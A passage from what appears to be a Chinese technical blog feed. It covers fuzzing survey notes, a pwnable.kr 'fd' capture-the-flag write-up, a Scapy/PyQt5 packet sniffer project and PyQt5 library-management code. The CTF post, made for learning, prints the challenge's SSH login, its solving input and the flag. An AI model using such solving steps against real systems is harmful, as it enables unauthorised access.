class="header-anchor">#</a></h3><p>有的情况下fuzzing的取值域会很广，例如MP3文件等。</p><p>因此如何选择最小的初始化种子集合称为种子选择问题，目的是：找到最小的初始种子集合，使得在fuzzing过程中覆盖率最大化。也就是使得fuzzing的效率更高。</p><p>例如我们有种子s1，它能覆盖到{10,20}，以及s2-&gt;{20,30}，那么如果这个时候种子s3-&gt;{10,20,30}，则显然以s3作为初始种子更加高效。</p><h3><span id="pseed-trimming">Seed Trimming</span><a href="#pseed-trimming" class="header-anchor">#</a></h3><p>较小的种子集合可能会消耗较少的内存并引发更高的吞吐量，所以一些fuzzers在fuzz之前减小种子集合的大小，这便是种子集合的修剪。</p><p>一般发生在PREPROCESS或者CONFUPDATE之中</p><h3><span id="ppreparing-a-driver-application">Preparing a Driver Application</span><a href="#ppreparing-a-driver-application" class="header-anchor">#</a></h3><p>对于一些没法直接fuzzing的情况，可能需要自己写一个driver程序。</p><h2><span id="pscheduling">SCHEDULING</span><a href="#pscheduling" class="header-anchor">#</a></h2><p>调度是只选择一个fuzz configuration，然后进入下一轮的fuzz。对于简单的fuzzer，例如zzuf，则没有这个步骤。已有的研究中，ADLFast，BFF等的亮点就在于他们使用的调度策略。</p><p>本节只讨论黑盒和灰盒 fuzzing中的调度策略。</p><h3><span id="pthe-fuzz-configuration-scheduling-fcs-problem">The Fuzz Configuration Scheduling (FCS) Problem</span><a href="#pthe-fuzz-configuration-scheduling-fcs-problem" class="header-anchor">#</a></h3><p>调度的目标：</p><ul><li>分析当前configure信息</li><li>找到可能有最好结果的输入：bugs最多或者覆盖面最大</li><li>…</li></ul><p>还有一些算法1中的解释，很明白</p><h3><span id="pblack-box-fcs-algorithms">Black-box FCS Algorithms</span><a href="#pblack-box-fcs-algorithms" class="header-anchor">#</a></h3><p>对于黑盒fuzzing来说，能够用于FCS的只有：已有的crashes和bugs信息+执行时间</p><p>举例</p><ul><li>HouseHolder、Foote提出成功率指标：#bugs / #runs</li><li>MAB 算法：faster to fuzz allows a fuzzer to either collect more unique bugs with it, or decrease the upperbound on its future success probability more rapidly.</li></ul><h3><span id="pgrey-box-fcs-algorithms">Grey-box FCS Algorithms</span><a href="#pgrey-box-fcs-algorithms" class="header-anchor">#</a></h3><p>灰盒fuzzing能获取的信息比黑盒更多，例如覆盖率等信息</p><p>AFL提出EA算法，EA算法维护了一系列的configuration，从中间选取fit的configurations用来生成待测用例</p><p>疑问三连：</p><ul><li>what makes a configuration fit？</li><li>how configurations are selected</li><li>how a selected configu- ration is used.</li></ul><p>大部分fuzzers都会考虑控制流关系。</p><ul><li><p>AFL的策略是选取最快最小的输入，称为fit（favorite）的</p></li><li><p>AFLfast优化了AFL，快7倍，发现了3个AFL没发现的bug</p><ul><li><p>选择路径频率最小的来探索稀有路径</p></li><li><p>基于优先级来选择configuration，而不是循环选择</p></li><li><p>使用power schedul</p></li></ul></li><li><p>AFLGo进一步优化了优先级策略</p></li></ul><h2><span id="pinput-generation">INPUT GENERATION</span><a href="#pinput-generation" class="header-anchor">#</a></h2><p>有的fuzzer通过在原有seed上突变来产生下一次的输入，而有的基于model产生下一次的输入</p><h3><span id="pmodel-based-generation-based-fuzzers">Model-based (Generation-based) Fuzzers</span><a href="#pmodel-based-generation-based-fuzzers" class="header-anchor">#</a></h3><ul><li><p>predefined model 预定义模型：1.在使用前由user定义模型；2. 模型由fuzzer通过预定义的语法等来自动构建</p></li><li><p>Inferred Model 推断模型：发生在PREPROCESS和CONFUPDATE阶段，通过数据驱动、状态机等实现推断</p></li><li><p>Encoder Model：常用于有固定格式的文件的fuzzer</p></li></ul><h3><span id="pmodel-less-mutation-based-fuzzers">Model-Less （Mutation-based）Fuzzers</span><a href="#pmodel-less-mutation-based-fuzzers" class="header-anchor">#</a></h3><p>这个很常见</p><ul><li>比特位翻转</li><li>算数变异</li><li>基于块的变异</li><li>基于字典的变异</li></ul><h3><span id="pwhite-box-fuzzers">White-box Fuzzers</span><a href="#pwhite-box-fuzzers" class="header-anchor">#</a></h3><ul><li>动态符号执行</li><li>启发式fuzzing</li><li>输入变异</li></ul><h2><span id="pinput-evaluation">INPUT EVALUATION</span><a href="#pinput-evaluation" class="header-anchor">#</a></h2><p>是对输入进行执行以及分析的过程</p><h3><span id="pbug-oracles">Bug Oracles</span><a href="#pbug-oracles" class="header-anchor">#</a></h3><p>用于判断是否有crash 或者有bug的policy，分类举例如下</p><ul><li><p>Memory and Type Safety：Address Sanitizer、SoftBounf/CETS、CFI</p></li><li><p>Undefined Behaviors：Memory Sanitizer 、Undefined Behavior Sanitizer、Thread Sanitizer</p></li><li><p>Input Validation：KameleonFuzz、μ4SQLi</p></li><li><p>Semantic Difference：black-box differential fuzz</p></li></ul><h3><span id="pexecution-optimizations">Execution Optimizations</span><a href="#pexecution-optimizations" class="header-anchor">#</a></h3><p>由于需要频繁运行程序，所以需要进行执行优化。例如函数级别的fuzz、通过fork已有的进程来免去加载时间等等</p><h3><span id="ptriage">Triage</span><a href="#ptriage" class="header-anchor">#</a></h3><p>分类是分析和报告导致违反策略的测试用例的过程。分类可以分为三个步骤：重复数据消除、优先级划分和测试用例最小化。</p><ul><li>重复数据消除方法：Stack Backtrace Hashing、Coverage-based Deduplication、Semantics-aware Deduplication</li><li>Prioritization and Exploitability：著名的有WinDbg的自动检测能够被利用!expoitable</li><li>Test case minimization：例如BFF、AFL等fuzzer使用的策略</li></ul><h2><span id="pconfiguration-updating">CONFIGURATION UPDATING</span><a href="#pconfiguration-updating" class="header-anchor">#</a></h2><p>黑盒、白盒、灰盒fuzzing在这一个步骤上区别很大</p><ul><li>Evolutionary Algorithm：维护seed pool，使其尽可能到达更多的路径</li><li>Maintaining a Minset：最小化测试用例集合，最大化覆盖率</li></ul><h2><span id="pge-ren-gan-jue">个人感觉</span><a href="#pge-ren-gan-jue" class="header-anchor">#</a></h2><p>整体上写了很多，并且分类也十分细致，抽取出了一个fuzzer的框架，但东西太多，点到为止。</p><p>看完其他的fuzzing paper再回来看这篇论文收获会更大。</p>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>fuzz</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— fd</title>
    <url>/98f1adad.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mommy! what is a file descriptor in Linux?</span><br><span class="line"></span><br><span class="line">* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:</span><br><span class="line">https:&#x2F;&#x2F;youtu.be&#x2F;971eZhMHQQw</span><br><span class="line"></span><br><span class="line">ssh fd@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上查看<code>ssh fd@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h3><span id="pfd-c">fd.c</span><a href="#pfd-c" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char buf[32];</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">	if(argc&lt;2)&#123;</span><br><span class="line">		printf(&quot;pass argv[1] a number\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	int fd &#x3D; atoi( argv[1] ) - 0x1234;</span><br><span class="line">	int len &#x3D; 0;</span><br><span class="line">	len &#x3D; read(fd, buf, 32);</span><br><span class="line">	if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;</span><br><span class="line">		printf(&quot;good job :)\n&quot;);</span><br><span class="line">		system(&quot;&#x2F;bin&#x2F;cat flag&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;learn about Linux file IO\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>当运行可执行程序<code>fd</code>后，会计算变量<code>fd</code>的值，然后作为<code>read</code>函数的参数对<code>read</code>函数进行调用<br><code>read</code>函数：</p><ul><li><code>fd</code>为0 ：标准输入</li><li><code>fd</code>为1 ：标准输出</li><li><code>fd</code>为2 ：标准错误输出</li></ul><p>所以在这里我们需要是<code>fd</code>为0，然后输入字符串<code>LETMEWIN</code>给<code>buf</code>，这样判断<code>strcmp(&quot;LETMEWIN\n&quot;, buf)</code>的结果为0，从而运行<code>system</code>函数可以查看到<code>flag</code></p><p>所以<code>atoi(argv[1])</code>的值应该等于<code>0x1234</code>,其十进制值为4660</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fd@ubuntu:~$ .&#x2F;fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>mommy! I think I know what a file descriptor is!!</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5+Scapy实现网络嗅探器CloudSniffer</title>
    <url>/e6624f61.html</url>
    <content><![CDATA[<h1><span id="cloudsniffer">CloudSniffer</span><a href="#cloudsniffer" class="header-anchor">#</a></h1><blockquote><p>课程实验，使用Scapy和PyQt5 实现了 一款Mac上的网络嗅探工具</p></blockquote><p><a href="https://github.com/ycdxsb/CloudSniffer" target="_blank" rel="noopener">CloudSniffer的Github链接</a></p><a id="more"></a><h4><span id="pgong-neng">功能</span><a href="#pgong-neng" class="header-anchor">#</a></h4><p><strong>基本功能</strong>：</p><ul><li>网卡选择</li><li>开始、停止抓包</li><li>清除数据</li><li>保存数据</li><li>读取数据</li><li>退出程序</li><li>流量包基本信息显示</li><li>协议分析</li><li>hexdump内容</li></ul><p><strong>统计功能</strong></p><ul><li><p>流量协议统计（帧数、字节数）</p></li><li><p>流入流量统计（帧数、字节数）</p></li><li><p>流出流量统计（帧数、字节数）</p></li><li><p>流量时间统计（字节数）</p></li><li><p>IP所在地查询</p></li></ul><p><strong>其他功能</strong></p><ul><li>嗅探前过滤、嗅探后过滤</li><li>html内容提取</li><li>日志记录</li></ul><h4><span id="pxiao-guo-zhan-shi">效果展示</span><a href="#pxiao-guo-zhan-shi" class="header-anchor">#</a></h4><p><strong>基本界面</strong></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdd61b42pej30zq0u0kak.jpg" alt="basic"></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdd61tgcwzg30m80i67ws.gif" alt="basic"></p><p><strong>统计功能</strong></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdd628yoh9j31cy0u0b29.jpg" alt="statistics"></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdd62v3bvxg30m80i8x6v.gif" alt="statistics"></p><p><strong>提取html内容</strong></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdd633t246j31oz0u0kjl.jpg" alt="extractHTML"></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdd63vvu4ug30m80i3hdz.gif" alt="extractHTML"></p><h4><span id="pan-zhuang-shi-yong">安装使用</span><a href="#pan-zhuang-shi-yong" class="header-anchor">#</a></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/ycdxsb/CloudSniffer.git</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> ./CloudSniffer</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> pip3 install requirements.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 CloudSniffer.py</span></span><br></pre></td></tr></table></figure><h4><span id="pcan-kao">参考</span><a href="#pcan-kao" class="header-anchor">#</a></h4><ul><li><a href="https://github.com/invernizzi/scapy-http" target="_blank" rel="noopener">scapy-http</a></li><li><a href="https://github.com/HatBoy/Pcap-Analyzer" target="_blank" rel="noopener">Pcap-Analyser</a></li></ul>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（11）——窗口信号与槽以及主窗口循环(项目完)</title>
    <url>/9f815f0d.html</url>
    <content><![CDATA[<h2><span id="pguan-li-yuan-zhu-ye-xin-hao-yu-cao">管理员主页信号与槽</span><a href="#pguan-li-yuan-zhu-ye-xin-hao-yu-cao" class="header-anchor">#</a></h2><h3><span id="pchuang-kou-nei-xin-hao-yu-cao">窗口内信号与槽</span><a href="#pchuang-kou-nei-xin-hao-yu-cao" class="header-anchor">#</a></h3><p>在管理员主页代码的<code>setUpUI</code>中，可以看到如下代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">self.addBookButton.clicked.connect(self.addBookButtonClicked)</span><br><span class="line">        self.dropBookButton.clicked.connect(self.dropBookButtonClicked)</span><br><span class="line">        self.userManageButton.clicked.connect(self.userManage)</span><br></pre></td></tr></table></figure><p>这是Qt自带的信号与槽机制，也就是<code>QPushButton</code>点击触发，分别是</p><ul><li>添加书籍按钮点击触发弹出添加书籍对话框</li><li>淘汰书籍按钮点击触发弹出淘汰书籍对话框</li><li>用户管理按钮点击弹出用户管理对话框</li></ul><a id="more"></a><h3><span id="pchuang-kou-jian-xin-hao-yu-cao">窗口间信号与槽</span><a href="#pchuang-kou-jian-xin-hao-yu-cao" class="header-anchor">#</a></h3><p>在管理员主页代码中的<code>addBookButtonClicked</code>和<code>dropBookButtonClicked</code>函数中，可以看到这样两行代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">addDialog.add_book_success_signal.connect(self.storageView.searchButtonClicked)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dropDialog.drop_book_successful_signal.connect(self.storageView.searchButtonClicked)</span><br></pre></td></tr></table></figure><p>同样的，我们找一下发送信号方的信号定义<br>在<code>borrowBookDialog</code>中有<code>borrow_book_success_signal = pyqtSignal()</code><br>同时可以在<code>borrowButtonClicked</code>函数中看到，当成功添加书籍时会发送信号<br>而我们在管理员主页中，将这个信号与库存查询组件的的<code>searchButtonClicked</code>连接，也就是实现了当书籍添加时，动态刷新库存。<br>UI交互良好</p><p>另一个也是一样，就不赘述了</p><h2><span id="pxue-sheng-yong-hu-zhu-ye-xin-hao-yu-cao">学生用户主页信号与槽</span><a href="#pxue-sheng-yong-hu-zhu-ye-xin-hao-yu-cao" class="header-anchor">#</a></h2><h3><span id="pchuang-kou-nei-xin-hao-yu-cao">窗口内信号与槽</span><a href="#pchuang-kou-nei-xin-hao-yu-cao" class="header-anchor">#</a></h3><p>与管理员主页一样，可以找到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">self.borrowBookButton.clicked.connect(self.borrowBookButtonClicked)</span><br><span class="line">       self.returnBookButton.clicked.connect(self.returnBookButtonClicked)</span><br><span class="line">       self.myBookStatus.clicked.connect(self.myBookStatusClicked)</span><br><span class="line">       self.allBookButton.clicked.connect(self.allBookButtonClicked)</span><br></pre></td></tr></table></figure><h3><span id="pchuang-kou-jian-xin-hao-yu-cao">窗口间信号与槽</span><a href="#pchuang-kou-jian-xin-hao-yu-cao" class="header-anchor">#</a></h3><p>在<code>borrowBookButtonClicked</code>函数可以找到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">borrowDialog.borrow_book_success_signal.connect(self.borrowStatusView.borrowedQuery)</span><br><span class="line">        borrowDialog.borrow_book_success_signal.connect(self.storageView.searchButtonClicked)</span><br></pre></td></tr></table></figure><p>这里既要刷新库存显示，同时也要刷新借书状态显示</p><p>在<code>returnBookButtonClicked</code>函数可以找到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">returnDialog.return_book_success_signal.connect(self.borrowStatusView.returnedQuery)</span><br><span class="line">       returnDialog.return_book_success_signal.connect(self.borrowStatusView.borrowedQuery)</span><br><span class="line">       returnDialog.return_book_success_signal.connect(self.storageView.searchButtonClicked)</span><br></pre></td></tr></table></figure><p>效果也是一样</p><h2><span id="pzhu-chuang-kou-xun-huan">主窗口循环</span><a href="#pzhu-chuang-kou-xun-huan" class="header-anchor">#</a></h2><p>在菜单栏中，有注册、修改密码、登录账户、退出登录、退出可以点击<br>当然其能否点击需要根据当前窗口决定，比如如果已登录，当然就不能点击登录和修改密码了<br>至于窗口的<code>setCentralWidget</code>调用，比如输入密码，是切换到用户主页还是到管理员主页，当然是看发射的信号是什么啦</p><h3><span id="pshi-xian-dai-ma">实现代码</span><a href="#pshi-xian-dai-ma" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import QIcon, QFont</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">from SignIn import SignInWidget</span><br><span class="line">from SignUp import SignUpWidget</span><br><span class="line">import sip</span><br><span class="line">from AdminHome import AdminHome</span><br><span class="line">from StudentHome import StudentHome</span><br><span class="line">from changePasswordDialog import changePasswordDialog</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Main(QMainWindow):</span><br><span class="line">    def __init__(self, parent&#x3D;None):</span><br><span class="line">        super(Main, self).__init__(parent)</span><br><span class="line">        self.layout &#x3D; QHBoxLayout()</span><br><span class="line">        self.widget &#x3D; SignInWidget()</span><br><span class="line">        self.resize(900, 600)</span><br><span class="line">        self.setWindowTitle(&quot;欢迎登陆图书馆管理系统&quot;)</span><br><span class="line">        self.setCentralWidget(self.widget)</span><br><span class="line">        bar &#x3D; self.menuBar()</span><br><span class="line">        self.Menu &#x3D; bar.addMenu(&quot;菜单栏&quot;)</span><br><span class="line">        self.signUpAction &#x3D; QAction(&quot;注册&quot;, self)</span><br><span class="line">        self.changePasswordAction &#x3D;QAction(&quot;修改密码&quot;,self)</span><br><span class="line">        self.signInAction &#x3D; QAction(&quot;登录&quot;, self)</span><br><span class="line">        self.quitSignInAction &#x3D; QAction(&quot;退出登录&quot;, self)</span><br><span class="line">        self.quitAction &#x3D; QAction(&quot;退出&quot;, self)</span><br><span class="line">        self.Menu.addAction(self.signUpAction)</span><br><span class="line">        self.Menu.addAction(self.changePasswordAction)</span><br><span class="line">        self.Menu.addAction(self.signInAction)</span><br><span class="line">        self.Menu.addAction(self.quitSignInAction)</span><br><span class="line">        self.Menu.addAction(self.quitAction)</span><br><span class="line">        self.signUpAction.setEnabled(True)</span><br><span class="line">        self.changePasswordAction.setEnabled(True)</span><br><span class="line">        self.signInAction.setEnabled(False)</span><br><span class="line">        self.quitSignInAction.setEnabled(False)</span><br><span class="line">        self.widget.is_admin_signal.connect(self.adminSignIn)</span><br><span class="line">        self.widget.is_student_signal[str].connect(self.studentSignIn)</span><br><span class="line">        self.Menu.triggered[QAction].connect(self.menuTriggered)</span><br><span class="line"></span><br><span class="line">    def adminSignIn(self):</span><br><span class="line">        sip.delete(self.widget)</span><br><span class="line">        self.widget &#x3D; AdminHome()</span><br><span class="line">        self.setCentralWidget(self.widget)</span><br><span class="line">        self.changePasswordAction.setEnabled(False)</span><br><span class="line">        self.signUpAction.setEnabled(True)</span><br><span class="line">        self.signInAction.setEnabled(False)</span><br><span class="line">        self.quitSignInAction.setEnabled(True)</span><br><span class="line"></span><br><span class="line">    def studentSignIn(self, studentId):</span><br><span class="line">        sip.delete(self.widget)</span><br><span class="line">        self.widget &#x3D; StudentHome(studentId)</span><br><span class="line">        self.setCentralWidget(self.widget)</span><br><span class="line">        self.changePasswordAction.setEnabled(False)</span><br><span class="line">        self.signUpAction.setEnabled(True)</span><br><span class="line">        self.signInAction.setEnabled(False)</span><br><span class="line">        self.quitSignInAction.setEnabled(True)</span><br><span class="line"></span><br><span class="line">    def menuTriggered(self, q):</span><br><span class="line">        if(q.text()&#x3D;&#x3D;&quot;修改密码&quot;):</span><br><span class="line">            changePsdDialog&#x3D;changePasswordDialog(self)</span><br><span class="line">            changePsdDialog.show()</span><br><span class="line">            changePsdDialog.exec_()</span><br><span class="line">        if (q.text() &#x3D;&#x3D; &quot;注册&quot;):</span><br><span class="line">            sip.delete(self.widget)</span><br><span class="line">            self.widget &#x3D; SignUpWidget()</span><br><span class="line">            self.setCentralWidget(self.widget)</span><br><span class="line">            self.widget.student_signup_signal[str].connect(self.studentSignIn)</span><br><span class="line">            self.signUpAction.setEnabled(False)</span><br><span class="line">            self.changePasswordAction.setEnabled(True)</span><br><span class="line">            self.signInAction.setEnabled(True)</span><br><span class="line">            self.quitSignInAction.setEnabled(False)</span><br><span class="line">        if (q.text() &#x3D;&#x3D; &quot;退出登录&quot;):</span><br><span class="line">            sip.delete(self.widget)</span><br><span class="line">            self.widget &#x3D; SignInWidget()</span><br><span class="line">            self.setCentralWidget(self.widget)</span><br><span class="line">            self.widget.is_admin_signal.connect(self.adminSignIn)</span><br><span class="line">            self.widget.is_student_signal[str].connect(self.studentSignIn)</span><br><span class="line">            self.signUpAction.setEnabled(True)</span><br><span class="line">            self.changePasswordAction.setEnabled(True)</span><br><span class="line">            self.signInAction.setEnabled(False)</span><br><span class="line">            self.quitSignInAction.setEnabled(False)</span><br><span class="line">        if (q.text() &#x3D;&#x3D; &quot;登录&quot;):</span><br><span class="line">            sip.delete(self.widget)</span><br><span class="line">            self.widget &#x3D; SignInWidget()</span><br><span class="line">            self.setCentralWidget(self.widget)</span><br><span class="line">            self.widget.is_admin_signal.connect(self.adminSignIn)</span><br><span class="line">            self.widget.is_student_signal[str].connect(self.studentSignIn)</span><br><span class="line">            self.signUpAction.setEnabled(True)</span><br><span class="line">            self.changePasswordAction.setEnabled(True)</span><br><span class="line">            self.signInAction.setEnabled(False)</span><br><span class="line">            self.quitSignInAction.setEnabled(False)</span><br><span class="line">        if (q.text() &#x3D;&#x3D; &quot;退出&quot;):</span><br><span class="line">            qApp &#x3D; QApplication.instance()</span><br><span class="line">            qApp.quit()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; Main()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h3><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9kfmjqjj30p40hr74n.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9kegp9cj30p60hht97.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9kf9sjmj30p90hmab8.jpg" alt="这里写图片描述"></p><h2><span id="pfu-shang-lian-jie">附上链接</span><a href="#pfu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p><h2><span id="pyi-xie-gan-xiang">一些感想</span><a href="#pyi-xie-gan-xiang" class="header-anchor">#</a></h2><blockquote><p>这个项目写了大概四天的样子，同时也是第一次使用Qt，很多机制其实自己都不太熟悉，像主窗口的切换，都处理的很潦草，移出控件都强行使用<code>sip.delete</code>删除。</p><p>Qt东西很多，但使用的时候去查阅一下就好了，前几天的大作业评比，感觉自己做的还是不够好，主要是功能不够全面。</p><p>一开始想先写完再说，到时候重构就是了，但最后又没有心思重构 。</p><p>希望下次做项目的时候，自己可以想好了再出发</p></blockquote>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（10）—— 学生主页以及修改代码</title>
    <url>/77aca64.html</url>
    <content><![CDATA[<h2><span id="pxue-sheng-zhu-ye-she-ji">学生主页设计</span><a href="#pxue-sheng-zhu-ye-she-ji" class="header-anchor">#</a></h2><h3><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h3><p>在学生主页，主要实现以下功能：<br>1、借阅书籍<br>2、归还书籍<br>3、借阅状态查询<br>4、书籍库存查询<br>使用四个<code>QPushButton</code>，分别用于弹出借阅书籍对话框、归还书籍对话框 、切换到借阅状态查询、切换到书籍库存查询</p><a id="more"></a><h3><span id="pshi-xian-dai-ma">实现代码</span><a href="#pshi-xian-dai-ma" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import QIcon, QFont</span><br><span class="line">from PyQt5.QtCore import Qt</span><br><span class="line">import sip</span><br><span class="line">import qdarkstyle</span><br><span class="line">from BookStorageViewer import BookStorageViewer</span><br><span class="line">from borrowBookDialog import borrowBookDialog</span><br><span class="line">from returnBookDialog import returnBookDialog</span><br><span class="line">from BorrowStatusViewer import BorrowStatusViewer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class StudentHome(QWidget):</span><br><span class="line">    def __init__(self, studentId):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self.StudentId &#x3D; studentId</span><br><span class="line">        self.resize(900, 600)</span><br><span class="line">        self.setWindowTitle(&quot;欢迎使用图书馆管理系统&quot;)</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        # 总布局</span><br><span class="line">        self.layout &#x3D; QHBoxLayout(self)</span><br><span class="line">        # 按钮布局</span><br><span class="line">        self.buttonLayout &#x3D; QVBoxLayout()</span><br><span class="line">        # 按钮</span><br><span class="line">        self.borrowBookButton &#x3D; QPushButton(&quot;借书&quot;)</span><br><span class="line">        self.returnBookButton &#x3D; QPushButton(&quot;还书&quot;)</span><br><span class="line">        self.myBookStatus &#x3D; QPushButton(&quot;借阅状态&quot;)</span><br><span class="line">        self.allBookButton &#x3D; QPushButton(&quot;所有书籍&quot;)</span><br><span class="line">        self.buttonLayout.addWidget(self.borrowBookButton)</span><br><span class="line">        self.buttonLayout.addWidget(self.returnBookButton)</span><br><span class="line">        self.buttonLayout.addWidget(self.myBookStatus)</span><br><span class="line">        self.buttonLayout.addWidget(self.allBookButton)</span><br><span class="line">        self.borrowBookButton.setFixedWidth(100)</span><br><span class="line">        self.borrowBookButton.setFixedHeight(42)</span><br><span class="line">        self.returnBookButton.setFixedWidth(100)</span><br><span class="line">        self.returnBookButton.setFixedHeight(42)</span><br><span class="line">        self.myBookStatus.setFixedWidth(100)</span><br><span class="line">        self.myBookStatus.setFixedHeight(42)</span><br><span class="line">        self.allBookButton.setFixedWidth(100)</span><br><span class="line">        self.allBookButton.setFixedHeight(42)</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.borrowBookButton.setFont(font)</span><br><span class="line">        self.returnBookButton.setFont(font)</span><br><span class="line">        self.myBookStatus.setFont(font)</span><br><span class="line">        self.allBookButton.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.storageView &#x3D; BookStorageViewer()</span><br><span class="line">        self.borrowStatusView&#x3D;BorrowStatusViewer(self.StudentId)</span><br><span class="line">        self.allBookButton.setEnabled(False)</span><br><span class="line"></span><br><span class="line">        self.layout.addLayout(self.buttonLayout)</span><br><span class="line">        self.layout.addWidget(self.storageView)</span><br><span class="line">        self.borrowBookButton.clicked.connect(self.borrowBookButtonClicked)</span><br><span class="line">        self.returnBookButton.clicked.connect(self.returnBookButtonClicked)</span><br><span class="line">        self.myBookStatus.clicked.connect(self.myBookStatusClicked)</span><br><span class="line">        self.allBookButton.clicked.connect(self.allBookButtonClicked)</span><br><span class="line"></span><br><span class="line">    def borrowBookButtonClicked(self):</span><br><span class="line">        borrowDialog &#x3D; borrowBookDialog(self.StudentId,self)</span><br><span class="line">        borrowDialog.borrow_book_success_signal.connect(self.borrowStatusView.borrowedQuery)</span><br><span class="line">        borrowDialog.borrow_book_success_signal.connect(self.storageView.searchButtonClicked)</span><br><span class="line">        borrowDialog.show()</span><br><span class="line">        borrowDialog.exec_()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def returnBookButtonClicked(self):</span><br><span class="line">        returnDialog &#x3D; returnBookDialog(self.StudentId,self)</span><br><span class="line">        returnDialog.return_book_success_signal.connect(self.borrowStatusView.returnedQuery)</span><br><span class="line">        returnDialog.return_book_success_signal.connect(self.borrowStatusView.borrowedQuery)</span><br><span class="line">        returnDialog.return_book_success_signal.connect(self.storageView.searchButtonClicked)</span><br><span class="line">        returnDialog.show()</span><br><span class="line">        returnDialog.exec_()</span><br><span class="line"></span><br><span class="line">  